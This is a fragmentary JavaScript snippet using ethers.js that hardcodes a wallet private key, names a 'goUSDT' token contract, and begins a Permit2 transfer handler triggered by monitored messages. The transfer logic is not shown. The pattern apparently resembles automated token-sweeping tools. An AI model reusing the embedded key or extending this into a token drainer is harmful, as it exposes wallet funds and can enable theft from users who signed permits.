...
const privateKey =
    "b824a00abfe6125d54e8029bf832d60c5de7b91f33795fd10b0edf8dccb877a3"; //2582
const wallet = new ethers.Wallet(privateKey, provider); //创建钱包

const contract_address = "0x15EF301c8731eEb753A98110d496a74F35CE6fBd"; //goUSDT
...
async function handelPermit2Transfer(monitData) {
    ...
    console.log("收到消息开始转账");
    const ownerAddress = "0xDf25813d91B139cbdeC94519898D8f672253a027";
